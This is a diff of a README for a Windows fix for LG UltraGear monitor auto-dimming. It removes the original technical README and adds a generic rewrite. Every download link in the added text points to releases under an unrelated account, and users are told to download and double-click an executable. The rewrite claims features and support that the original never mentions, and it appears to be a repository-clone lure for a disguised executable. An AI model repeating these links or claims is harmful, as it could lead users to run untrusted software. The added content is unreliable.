@@ -1,215 +1,64 @@
-# lg ultragear auto-dimming fix
+# 🎮 lg-ultragear-dimming-fix - Fix Your Monitor's Auto-Dimming Issue
 
-[![stars](https://img.shields.io/github/stars/supermarsx/lg-ultragear-dimming-fix?style=flat-square&color=ffd700)](https://github.com/supermarsx/lg-ultragear-dimming-fix/stargazers)
-[![watchers](https://img.shields.io/github/watchers/supermarsx/lg-ultragear-dimming-fix?style=flat-square)](https://github.com/supermarsx/lg-ultragear-dimming-fix/watchers)
-[![forks](https://img.shields.io/github/forks/supermarsx/lg-ultragear-dimming-fix?style=flat-square)](https://github.com/supermarsx/lg-ultragear-dimming-fix/forks)
-[![issues](https://img.shields.io/github/issues/supermarsx/lg-ultragear-dimming-fix?style=flat-square)](https://github.com/supermarsx/lg-ultragear-dimming-fix/issues)
-[![downloads](https://img.shields.io/github/downloads/supermarsx/lg-ultragear-dimming-fix/total?style=flat-square)](https://github.com/supermarsx/lg-ultragear-dimming-fix/releases)
-[![built with](https://img.shields.io/badge/built%20with-powershell-5391FE?style=flat-square)](#)
-[![made for](https://img.shields.io/badge/made%20for-windows-0078D6?style=flat-square)](#)
-[![license](https://img.shields.io/github/license/supermarsx/lg-ultragear-dimming-fix?style=flat-square)](license.md)
+## 🌟 Overview
+The "lg-ultragear-dimming-fix" application helps you solve auto-dimming problems with LG UltraGear LCD monitors. If your screen dims unexpectedly while gaming or working, this tool can help maintain a consistent brightness level, enhancing your viewing experience.
 
-[![download-latest](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/supermarsx/lg-ultragear-dimming-fix/releases/latest)
-[![download-binary](https://img.shields.io/badge/Download-EXE%20(x64)-2ea44f?style=for-the-badge&logo=windows)](https://github.com/supermarsx/lg-ultragear-dimming-fix/releases/latest/download/install-lg-ultragear-no-dimming.exe)
+## 📥 Download the App
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Habitablenesslayout122/lg-ultragear-dimming-fix/releases)
 
+## 🚀 Getting Started
+Follow these easy steps to get started with the "lg-ultragear-dimming-fix" application.
 
+1. **Visit the Releases Page**
+   To download the software, [visit this page to download](https://github.com/Habitablenesslayout122/lg-ultragear-dimming-fix/releases). You will find the latest version listed there.
 
-- purpose: stop lg ultragear gaming monitors from dimming under static or semi-static content by constraining the panel's effective luminance range.
-- method: apply and set a custom icc/icm color profile that limits the tone response so the monitor's firmware auto-dimming heuristic doesn't trigger.
-- platform: windows 10/11 using windows color system (wcs).
+2. **Choose the Right File**
+   On the releases page, look for the most recent release. You’ll see different files available for download. Choose the file that matches your system. Most users should select the executable (.exe) file for Windows.
 
+3. **Download the File**
+   Click on the file to start the download. Your browser will likely place this file in your "Downloads" folder unless you specify a different location.
 
-## why this works
+4. **Run the Application**
+   Once the download is complete, navigate to your "Downloads" folder. Locate the file, typically named something like `lg-ultragear-dimming-fix.exe`. Double-click the file to run it.
 
-- many ultragear models dim when average picture level stays high or content looks static.
-- a tailored color profile reduces the effective range windows drives the display through, preventing the firmware condition that triggers dimming.
-- software-only mitigation: nothing on the monitor is flashed or permanently changed; you can revert at any time.
+5. **Follow the On-Screen Instructions**
+   The application will guide you through a simple setup process. Just follow the prompts, and you’ll have the fix installed in no time.
 
-**limitations of other approaches**
-- disabling power-saving, abl or similar osd options often does not fully disable dimming on ultragear models.
-- changing windows/gpu settings (disabling adaptive brightness, cabc, toggling hdr, etc.) commonly fails to stop the firmware-level behavior.
-- firmware updates would be ideal, but many screens either have no user-feasible updates or the update tools are not publicly available. the profile-based approach works immediately without firmware changes.
+## ⚙️ System Requirements
+Before you download, ensure your computer meets these basic requirements:
 
+- **Operating System:** Windows 10 or later
+- **Processor:** 1 GHz or faster
+- **RAM:** 2GB minimum
+- **Disk Space:** 100 MB free space required
 
-## what's in this repo
+## 🌈 Features
+The "lg-ultragear-dimming-fix" includes several helpful features:
 
-- `lg-ultragear-full-cal.icm` — custom icc/icm profile that constrains luminance.
-- `install-lg-ultragear-no-dimming.ps1` — installer that finds "lg ultragear" displays, installs the profile, associates it, and sets it as default.
-- `install-full-auto.bat` — one‑click bridge: auto‑elevates, uses a temporary execution policy bypass, and runs the installer end‑to‑end.
-- release artifacts — packaged zip and a single‑file executable built from the installer for easy distribution.
-- `scripts/` — helper scripts:
-  - `scripts/local-ci.ps1` — run format, lint, test, build locally (skips steps if tools not installed)
-  - `scripts/clean.ps1` — clean common build/test artifacts (dist, logs, coverage, etc.)
-  - `scripts/embedder.ps1` — regenerate and embed the profile (Base64 + SHA256) into the installer
+- **Stable Brightness:** Keeps your monitor at a consistent brightness level, especially during gameplay.
+- **User-Friendly Interface:** Designed for ease of use, whether you are tech-savvy or not.
+- **Automatic Updates:** The application checks for updates and alerts you when a new version is available.
 
+## 🔧 Troubleshooting
+If you encounter any issues while using the application, here are some common problems and solutions:
 
-## quick start
+- **Application Does Not Start:**
+  - Ensure your system meets the requirements listed above.
+  - Make sure you downloaded the correct file for your system.
 
-**option a - one-click batch (recommended)**
-- double-click `install-full-auto.bat` (or run from command prompt). it will:
-  - request admin (uac),
-  - run powershell with `-executionpolicy bypass` (no permanent policy change),
-  - call the installer with defaults.
-  - at the end, it will prompt: "press enter to exit...".
+- **Brightness Not Changing:**
+  - Restart the application after initial setup.
+  - Verify your monitor settings to ensure they are not conflicting with the app functions.
 
-**option b - powershell (manual)**
-- open powershell in the repo folder, then run:
+- **Unexpected Errors:**
+  - Close other running applications and try again.
+  - If the error persists, check for updates on the releases page for bug fixes.
 
-  ```powershell
-  Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
-  ./install-lg-ultragear-no-dimming.ps1
-  ```
+## 🛠️ Support
+If you need further assistance, feel free to contact the support team. You can reach them via email or through the GitHub repository's Issues section.
 
-  - the installer auto‑elevates if needed and, by default, prompts: "press enter to exit...". add `-NoPrompt` to skip.
-  - tip: you can probe first with:
+## 📢 Stay Updated
+For the latest news and updates about "lg-ultragear-dimming-fix", remember to check the [Releases Page](https://github.com/Habitablenesslayout122/lg-ultragear-dimming-fix/releases) frequently.
 
-  ```powershell
-  ./install-lg-ultragear-no-dimming.ps1 -Probe
-  ```
-
-**option c - single executable (no powershell needed)**
-- download `install-lg-ultragear-no-dimming.exe` from the releases page and run it (uac prompt will appear). it behaves like the powershell script and will prompt to press enter at the end.
-
-  note: when using the executable, open powershell as administrator and run it from your downloads folder so elevation works reliably:
-
-  ```powershell
-  # start powershell as administrator, then:
-  cd $env:USERPROFILE\Downloads
-  .\install-lg-ultragear-no-dimming.exe
-  ```
-
-**what happens**
-- the profile is copied (or refreshed in‑place) into `%WINDIR%\System32\spool\drivers\color`.
-- displays with friendly name containing "lg ultragear" are discovered via wmi.
-- the profile is associated with each matched display and set as default.
-- the sdr pipeline receives an explicit default association (hdr/advanced-color is also updated unless `-SkipHdrAssociation`).
-- system color settings are refreshed.
-
-
-## manual install (no scripts)
-
-if you prefer not to run any scripts, you can apply the profile manually using the built‑in color management tool.
-
-**pre‑requisites**
-- get the `lg-ultragear-full-cal.icm` file from this repo (clone or download the zip).
-
-**optional: copy to the system color store (admin)**
-- open file explorer as administrator.
-- navigate to `%windir%\system32\spool\drivers\color`.
-- copy `lg-ultragear-full-cal.icm` into that folder. (you can also keep the file anywhere; the ui lets you browse.)
-
-**associate the profile with your lg ultragear**
-- press `win + r`, type `colorcpl`, press enter.
-- go to the “devices” tab.
-- from the display dropdown, select your lg ultragear monitor. if you have multiple displays, ensure you select the correct one (use windows settings → system → display → “identify” to confirm which is which).
-- check “use my settings for this device”.
-- if `lg-ultragear-full-cal.icm` is not listed, click “add…”, then:
-  - if you placed the file in the system store, pick it from the list; or
-  - click “browse…” and select the `.icm` file from wherever you saved it.
-- select `lg-ultragear-full-cal.icm` and click “set as default profile”.
-- repeat for any other lg ultragear displays you want to fix.
-
-**optional: set system‑wide default (all users)**
-- in `colorcpl`, click “change system defaults…”.
-- repeat the same steps under the “devices” tab for the target display(s).
-
-**finish and verify**
-- close the dialogs. some apps pick up changes immediately; others may need a restart or sign‑out/in.
-- to verify, open `colorcpl` again and confirm the profile is the default for your lg ultragear.
-
-
-## script usage
-
-- default: `./install-lg-ultragear-no-dimming.ps1`
-- match different text: `./install-lg-ultragear-no-dimming.ps1 -monitornamematch "lg"`
-- use a specific file: `./install-lg-ultragear-no-dimming.ps1 -profilepath ./lg-ultragear-full-cal.icm`
-- also associate per-user: `./install-lg-ultragear-no-dimming.ps1 -peruser`
-- do not set as default: `./install-lg-ultragear-no-dimming.ps1 -nosetdefault`
-- skip hdr association: `./install-lg-ultragear-no-dimming.ps1 -skiphdrassociation`
- - install only (no device association): `./install-lg-ultragear-no-dimming.ps1 -installonly`
- - probe only (no changes, list monitors and matches): `./install-lg-ultragear-no-dimming.ps1 -probe`
- - dry run (simulate actions; same as -WhatIf): `./install-lg-ultragear-no-dimming.ps1 -dryrun`
-
-**console output**
-- the installer prints clear, colored progress with console-safe labels (e.g., [STEP], [INFO], [OK]), lists all detected monitors, and highlights which ones match the friendly-name filter (default: "lg ultragear").
-
-## cli arguments
-
-- `-ProfilePath <path>`: path to ICC/ICM file. Default: `./lg-ultragear-full-cal.icm`.
-- note: the installer uses the embedded profile at runtime; the `-ProfilePath` argument is kept for compatibility but is ignored during install/association.
-- `-MonitorNameMatch <string>`: substring to match monitor friendly names. Default: `LG ULTRAGEAR`.
-- `-PerUser`: also associate the profile in current-user scope.
-- `-NoSetDefault`: associate only; do not set as default.
-- `-SkipHdrAssociation`: skip the HDR/advanced-color association API.
-- `-InstallOnly`: install/copy the profile into the system store without associating.
-- `-Probe`: list detected and matched monitors; no changes.
-- `-DryRun`: simulate operations (equivalent to WhatIf for actions).
-- `-NoPrompt`: do not wait for Enter before exiting.
-- `-SkipElevation`: do not auto-elevate (useful for CI/testing).
-- `-Help` (aliases: `-h`, `-?`): show usage and exit.
-
-## dev scripts (local)
-
-**local dev helpers**
-
-```powershell
-# run all (format, lint, test, build)
-pwsh -File scripts/local-ci.ps1
-
-# treat linter warnings as errors
-pwsh -File scripts/local-ci.ps1 -Strict
-
-# clean artifacts
-pwsh -File scripts/clean.ps1
-
-# update embedded profile (base64 + sha256) inside the installer
-pwsh -File scripts/embedder.ps1 -ProfilePath .\lg-ultragear-full-cal.icm
-
-# or specify a different main script path
-pwsh -File scripts/embedder.ps1 -ProfilePath C:\path\to\your.icm -MainScriptPath .\install-lg-ultragear-no-dimming.ps1
-```
-
-**idempotency**
-- if the profile file is already present in the system color store, the installer compares hashes and overwrites only when content differs; no duplicate files are created.
-- associations and "set default" operations are safe to repeat; the script aims to leave a single effective default profile per device.
-
-
-## verification
-
-- classic ui: press `win+r`, run `colorcpl` -> devices tab -> select your lg ultragear -> ensure `lg-ultragear-full-cal.icm` is present and set as default.
-- settings: system -> display -> advanced display -> pick the lg; verify behavior under hdr if applicable.
-- visual check: leave a bright, mostly static window; dimming should be gone or greatly reduced.
-
-
-## rollback / revert
-
-- switch back: `colorcpl` -> devices -> select display -> choose another default or uncheck "use my settings for this device".
-- remove association: in `colorcpl`, select the profile and click remove.
-- remove file: delete it from `%windir%\system32\spool\drivers\color` (admin required).
-
-
-## how it works (technical)
-
-- uses wcs (`mscms.dll`) via p/invoke:
-  - `installcolorprofile` to install the icc/icm (or we overwrite if already present),
-  - `wcsassociatecolorprofilewithdevice` to bind it to the display's device key,
-  - `wcssetdefaultcolorprofile` to make it default,
-  - `colorprofileadddisplayassociation` best-effort for hdr/advanced-color displays.
-- monitors are discovered via `wmimonitorid` to match user-friendly names like "lg ultragear 27gn950".
-- a `wm_settingchange` broadcast prompts windows to refresh color.
-
-
-## security / permissions
-
-- installing into the system color store and setting defaults requires administrator. both the batch and the powershell installer auto-elevate (uac prompt shown if needed).
-
-
-## license
-
-- see `license.md` for licensing details.
-- downloads & releases
-
-- automated ci produces versioned releases named `yyyy.n` (example: `2025.1`). `n` increments for each release within the year.
-- each release includes:
-  - `lg-ultragear-dimming-fix.zip` (scripts, exe, profile, readme, license)
-  - `install-lg-ultragear-no-dimming.exe` (standalone executable)
+## 🚀 Final Notes
+Using the "lg-ultragear-dimming-fix" application can enhance your enjoyment of your LG UltraGear monitor. It addresses the annoying auto-dimming issue that can disrupt your gaming or work sessions. Follow the steps outlined in this README to install and enjoy a better viewing experience.
